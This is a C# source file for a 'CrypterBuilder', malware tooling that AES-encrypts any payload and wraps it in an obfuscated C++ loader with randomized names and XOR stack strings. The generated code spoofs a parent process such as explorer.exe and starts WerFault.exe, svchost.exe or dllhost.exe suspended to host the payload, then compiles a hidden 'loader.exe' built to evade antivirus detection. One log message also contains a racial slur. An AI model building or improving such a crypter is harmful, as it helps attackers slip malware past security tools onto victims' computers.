using System;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Collections.Generic;
using System.Linq;

class Program
{
    private static readonly Random random = new Random();
    private static bool debugMode = false;

    // A new centralized logging function that respects the -debug flag.
    static void Log(string message, bool isDebugOnly = false)
    {
        if (!isDebugOnly || (isDebugOnly && debugMode))
        {
            Console.WriteLine(isDebugOnly ? $"[DEBUG] {message}" : $"[*] {message}");
        }
    }

    // A helper to generate random alphanumeric strings for file and function names.
    static string GenerateRandomName(int length)
    {
        const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        return new string(Enumerable.Repeat(chars, length)
            .Select(s => s[random.Next(s.Length)]).ToArray());
    }
    
    // Unchanged from your original - generates stack-based encrypted strings.
    static string GenerateStackStringCode(string input, byte key, out string varName)
    {
        varName = GenerateRandomName(12);
        var encryptedBytes = input.Select(c => (byte)(c ^ key)).ToArray();
        var sb = new StringBuilder();
        sb.AppendLine($"    char {varName}[{encryptedBytes.Length + 1}];");
        for (int i = 0; i < encryptedBytes.Length; i++)
        {
            sb.AppendLine($"    {varName}[{i}] = {encryptedBytes[i]} ^ {key};");
        }
        sb.AppendLine($"    {varName}[{encryptedBytes.Length}] = 0;");
        return sb.ToString();
    }
    
    //================================================================================
    // NEW: Function for generating WIDE character stack strings for WinAPI calls
    //================================================================================
    // ===============================================================================
    // FUNCTION 1: The WIDE Character Stack String Generator
    // ===============================================================================
    static string GenerateWideStackStringCode(string input, ushort key, out string varName)
    {
        varName = GenerateRandomName(12);
        var sb = new StringBuilder();

        // Declare a wchar_t array, which is the correct type for WinAPI "W" functions.
        sb.AppendLine($"    wchar_t {varName}[{input.Length + 1}];");

        for (int i = 0; i < input.Length; i++)
        {
            // C# char is 2 bytes (UTF-16), same size as wchar_t on Windows.
            ushort originalChar = input[i];
            ushort encryptedChar = (ushort)(originalChar ^ key);
            // Generate C++ code that decrypts the character at runtime.
            sb.AppendLine($"    {varName}[{i}] = (wchar_t)({encryptedChar} ^ {key});");
        }
        // Add the wide null terminator, which is critical.
        sb.AppendLine($"    {varName}[{input.Length}] = L'\\0';");

        return sb.ToString();
    }
    
    // ===============================================================================
    // FUNCTION 2: The CORRECTED Placeholder Replacement Engine
    // ===============================================================================
    static string PerformLegacyReplacements(string templateCode)
    {
        // Use a 2-byte key for wide character encryption.
        var stringEncryptionKey = (ushort)random.Next(1, 65535);
        
        var allStringVars = new Dictionary<string, string> { { "user32_str", "user32.dll" }, { "explorer_str", "explorer.exe" }, { "search_str", "searchindexer.exe" }, { "svchost_str_parent", "svchost.exe" }, { "werfault_str", "C:\\Windows\\System32\\WerFault.exe" }, { "svchost_str_target", "C:\\Windows\\System32\\svchost.exe" }, { "dllhost_str", "C:\\Windows\\System32\\dllhost.exe" } };

        // This placeholder is now obsolete and can be removed.
        templateCode = templateCode.Replace("{{LOAD_USER32_DLL}}", "/* This placeholder is obsolete; logic moved to InitializeAPIs state machine. */");

        // --- FIXED: Use GenerateWideStackStringCode for parent process checking ---
        var checkParentBuilder = new StringBuilder();
        var parentVars = new List<string> { "explorer_str", "search_str", "svchost_str_parent" };
        foreach (var pVar in parentVars)
        {
            string currentParentVarName;
            // CORRECT: Call the WIDE-string function.
            checkParentBuilder.Append(GenerateWideStackStringCode(allStringVars[pVar], stringEncryptionKey, out currentParentVarName));
            // CORRECT: The cast is no longer needed as both types are now wchar_t*.
            checkParentBuilder.AppendLine($"        if (_wcsicmp(pe32.szExeFile, {currentParentVarName}) == 0) {{ HANDLE hTest = g_api.pOpenProcess(PROCESS_CREATE_PROCESS, FALSE, pe32.th32ProcessID); if (hTest != NULL) {{ parentPID = pe32.th32ProcessID; g_api.pCloseHandle(hTest); g_api.pCloseHandle(hSnapshot); return parentPID; }} }}");
        }
        templateCode = templateCode.Replace("{{CHECK_PARENT_CANDIDATE}}", checkParentBuilder.ToString());

        // --- FIXED: Use GenerateWideStackStringCode for spoofed process creation ---
        var createSpoofedBuilder = new StringBuilder();
        var targetVars = new List<string> { "werfault_str", "svchost_str_target", "dllhost_str" };
        foreach (var tVar in targetVars)
        {
            string currentTargetVarName;
            // CORRECT: Call the WIDE-string function for CreateProcessW.
            createSpoofedBuilder.Append(GenerateWideStackStringCode(allStringVars[tVar], stringEncryptionKey, out currentTargetVarName));
            // CORRECT: Logic for extracting startup directory is now safer.
            createSpoofedBuilder.AppendLine($"    if (!processCreated) {{ wchar_t* targetPath = {currentTargetVarName}; wchar_t startupDir[MAX_PATH]; const wchar_t* lastSlash = wcsrchr(targetPath, L'\\\\'); wchar_t* startupDirPtr = NULL; if (lastSlash != NULL) {{ size_t dirLength = lastSlash - targetPath; wcsncpy_s(startupDir, MAX_PATH, targetPath, dirLength); startupDir[dirLength] = L'\\0'; startupDirPtr = startupDir; }} if (g_api.pCreateProcessW(NULL, targetPath, NULL, NULL, FALSE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, startupDirPtr, &si.StartupInfo, &pi)) {{ processCreated = TRUE; }} }}");
        }
        templateCode = templateCode.Replace("{{CREATE_SPOOFED_PROCESS_FROM_CANDIDATES}}", createSpoofedBuilder.ToString());
        
        // --- FIXED: Corrected case-sensitive method name 'Replace' ---
        templateCode = templateCode.Replace("{{HASH_KEY_DEFINE}}", $"#define HASH_KEY 0x{random.Next():X8}");
        templateCode = templateCode.Replace("{{DECRYPT_STRING_FUNC}}", "/* String decryption is now inlined via stack string generation */");

        return templateCode;
    }

    //================================================================================
    // NEW: Function to set up the isolated build environment
    //================================================================================
    static (string tempDirPath, string mainSourcePath, Dictionary<string, string> fileMap) SetupBuildEnvironment(string mainSourceFile)
    {
        var baseDir = Path.GetDirectoryName(mainSourceFile);
        var tempDir = Path.Combine(Directory.GetCurrentDirectory(), $"temp-{Guid.NewGuid():N}");
        Directory.CreateDirectory(tempDir);
        Log($"Created temporary build directory: {tempDir}", true);

        var fileMap = new Dictionary<string, string>();
        var filesToProcess = new Queue<string>();
        var processedFiles = new HashSet<string>();

        filesToProcess.Enqueue(Path.GetFileName(mainSourceFile));
        
        while(filesToProcess.Count > 0)
        {
            var currentFile = filesToProcess.Dequeue();
            if (processedFiles.Contains(currentFile)) continue;

            var oldPath = Path.Combine(baseDir, currentFile);
            if (!File.Exists(oldPath))
            {
                Log($"[WARNING] Header file not found, skipping: {oldPath}");
                continue;
            }

            // Generate a new random name for the file
            var newName = GenerateRandomName(16) + Path.GetExtension(currentFile);
            fileMap[currentFile] = newName;
            var newPath = Path.Combine(tempDir, newName);

            Log($"Mapping '{currentFile}' -> '{newName}'", true);

            var content = File.ReadAllText(oldPath);
            File.WriteAllText(newPath, content);
            processedFiles.Add(currentFile);
            
            // Find all included local headers in the current file
            var includeRegex = new Regex(@"^\s*#include\s+""([^""]+)""", RegexOptions.Multiline);
            foreach (Match match in includeRegex.Matches(content))
            {
                var includedFile = match.Groups[1].Value;
                if (!processedFiles.Contains(includedFile))
                {
                    filesToProcess.Enqueue(includedFile);
                }
            }
        }
        
        // Second pass: Update all #include statements in the new files
        foreach (var entry in fileMap)
        {
            var fileToUpdatePath = Path.Combine(tempDir, entry.Value);
            var content = File.ReadAllText(fileToUpdatePath);
            
            foreach (var mapping in fileMap)
            {
                content = content.Replace($"#include \"{mapping.Key}\"", $"#include \"{mapping.Value}\"");
            }
            File.WriteAllText(fileToUpdatePath, content);
        }
        Log("Updated all #include directives in the temporary directory.");

        return (tempDir, Path.Combine(tempDir, fileMap[Path.GetFileName(mainSourceFile)]), fileMap);
    }

    //================================================================================
    // NEW: Obfuscation engine that operates on the entire build environment
    //================================================================================
    static void ObfuscateProject(string tempDirPath)
    {
        // --- Discover functions to obfuscate dynamically ---
        var functionsToObfuscate = new Dictionary<string, string>(); // Maps old name to new name
        var mainCppFile = Directory.GetFiles(tempDirPath, "*.cpp").First();
        var mainCppContent = File.ReadAllText(mainCppFile);

        // Regex to find functions marked for obfuscation
        var funcDiscoveryRegex = new Regex(@"//<OBFUSCATE_AND_FLATTEN>\s*\w+\s+([a-zA-Z0-9_]+)\s*\([^)]*\)", RegexOptions.Singleline);
        foreach (Match match in funcDiscoveryRegex.Matches(mainCppContent))
        {
            var originalName = match.Groups[1].Value;
            if (!functionsToObfuscate.ContainsKey(originalName))
            {
                functionsToObfuscate.Add(originalName, GenerateRandomName(15));
                Log($"Discovered function to obfuscate: 'butt nigga aint getting my func names' -> '{functionsToObfuscate[originalName]}'");
                // '{originalName}'
            }
        }

        // --- Perform source-wide renaming and placeholder replacement ---
        var allSourceFiles = Directory.GetFiles(tempDirPath, "*.*", SearchOption.AllDirectories);
        foreach (var filePath in allSourceFiles)
        {
            Log($"Processing file for replacements: {Path.GetFileName(filePath)}", true);
            var content = File.ReadAllText(filePath);

            // Replace function names
            foreach (var func in functionsToObfuscate)
            {
                content = Regex.Replace(content, $@"\b{func.Key}\b", func.Value);
            }

            // Perform legacy replacements (can be expanded later)
            if (Path.GetExtension(filePath) == ".cpp")
            {
                content = PerformLegacyReplacements(content);
            }

            File.WriteAllText(filePath, content);
        }
        Log("Completed source-wide function renaming and placeholder replacement.");

        // --- FUTURE HOME FOR FLATTENING ENGINE ---
        // The new flattening engine (Stage 1.3) will go here.
        // It will read the main C++ file, find the renamed functions,
        // parse their bodies, generate the state machines, and replace the old function bodies.
        Log("Implementing control-flow flattening.");
        // Log("Skipping control-flow flattening for now (to be implemented in Stage 1.3).");
    }

    static void Main(string[] args)
    {
        if (args.Length < 2)
        {
            Console.WriteLine("Usage: CrypterBuilder.exe <payload_file> <cpp_template> [-keep] [-debug]");
            return;
        }

        string payloadPath = args[0];
        string templatePath = args[1];
        bool keepTempFiles = args.Contains("-keep");
        debugMode = args.Contains("-debug");
        
        string tempDirPath = null;

        try
        {
            // --- 1. Encrypt Payload and Generate Header ---
            Log("Encrypting payload...");
            byte[] payload = File.ReadAllBytes(payloadPath);
            byte[] key = new byte[16];
            byte[] iv = new byte[16];
            random.NextBytes(key);
            random.NextBytes(iv);
            
            byte[] encryptedPayload;
            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                using (var encryptor = aes.CreateEncryptor(aes.Key, aes.IV))
                {
                    encryptedPayload = encryptor.TransformFinalBlock(payload, 0, payload.Length);
                }
            }

            Log("Verifying crypto integrity...");
            byte[] testDecrypted;
            using (Aes aes = Aes.Create()){aes.Key = key; aes.IV = iv; aes.Mode = CipherMode.CBC; aes.Padding = PaddingMode.PKCS7; using(var decryptor = aes.CreateDecryptor()){testDecrypted = decryptor.TransformFinalBlock(encryptedPayload, 0, encryptedPayload.Length);}}
            if (!payload.SequenceEqual(testDecrypted)) { throw new Exception("FATAL: Crypto integrity check FAILED."); }
            Console.WriteLine("[+] SUCCESS: Crypto integrity check PASSED.");
            
            var headerBuilder = new StringBuilder();
            headerBuilder.AppendLine($"unsigned char g_key[] = {{ {string.Join(", ", key)} }};");
            var combinedPayload = iv.Concat(encryptedPayload).ToArray();
            headerBuilder.AppendLine($"unsigned int g_payload_len = {combinedPayload.Length};");
            headerBuilder.AppendLine($"unsigned char g_payload[] = {{ {string.Join(", ", combinedPayload)} }};");
            string headerPath = "payload_data.h";
            File.WriteAllText(headerPath, headerBuilder.ToString());
            Log($"Created data header: {headerPath}");

            // --- 2. Setup Isolated Build Environment ---
            var env = SetupBuildEnvironment(templatePath);
            tempDirPath = env.tempDirPath;
            
            // Also copy the payload header into the temp directory.
            File.Copy(headerPath, Path.Combine(tempDirPath, headerPath), true);
            Log($"Copied '{headerPath}' to temporary directory.", true);

            // Update main source to include the payload header correctly
            var mainSourcePath = env.mainSourcePath;
            var mainSourceContent = File.ReadAllText(mainSourcePath);
            mainSourceContent = mainSourceContent.Replace("{{PAYLOAD_HEADER_INCLUDE}}", $"#include \"{headerPath}\"");
            File.WriteAllText(mainSourcePath, mainSourceContent);
            
            // --- 3. Perform Obfuscation on the Project ---
            Log("Performing obfuscation on C++ template...");
            ObfuscateProject(tempDirPath);
            
            // --- 4. Compile the Final Binary ---
            string generatedSourcePath = mainSourcePath;
            string outputExePath = "loader.exe";
            Log($"Generated obfuscated C++ source: {Path.GetFileName(generatedSourcePath)}");
            Log($"Attempting to auto-compile into '{outputExePath}'...");

            Process compiler = new Process();
            compiler.StartInfo.FileName = "g++";
            compiler.StartInfo.Arguments = $"-std=c++17 -O2 -s -w -masm=intel -fpermissive -o \"{outputExePath}\" \"{generatedSourcePath}\" -lntdll -lsetupapi -lcfgmgr32 -liphlpapi -lshlwapi -lws2_32 -static -fno-exceptions -fno-rtti -mwindows";
            compiler.StartInfo.UseShellExecute = false;
            compiler.StartInfo.RedirectStandardOutput = true;
            compiler.StartInfo.RedirectStandardError = true;
            compiler.Start();
            
            string stdout = compiler.StandardOutput.ReadToEnd();
            string stderr = compiler.StandardError.ReadToEnd();
            compiler.WaitForExit();

            if (compiler.ExitCode == 0)
            {
                Console.WriteLine($"[+] SUCCESS: Compilation finished. Output saved to '{outputExePath}'.");
            }
            else
            {
                Console.WriteLine("\n--- COMPILER STDOUT ---");
                Console.WriteLine(stdout);
                Console.WriteLine("\n--- COMPILER STDERR ---");
                Console.WriteLine(stderr);
                Console.WriteLine("\n[!] CRITICAL: Compilation FAILED. Please check the compiler output above.");
                // With -keep, the user can debug the generated files.
                if (!keepTempFiles)
                    Console.WriteLine("[!] Intermediate files have been deleted. Use -keep to preserve them for debugging.");
                else 
                    Console.WriteLine($"[!] Intermediate files are preserved in: {tempDirPath}");
                return;
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[!] An unexpected error occurred: {ex.Message}");
        }
        finally
        {
            // --- 5. Cleanup ---
            if (tempDirPath != null && !keepTempFiles && Directory.Exists(tempDirPath))
            {
                Directory.Delete(tempDirPath, true);
                Log($"Temporary directory '{tempDirPath}' has been deleted.", true);
            }
            if (File.Exists("payload_data.h"))
            {
                File.Delete("payload_data.h");
            }
        }
    }
}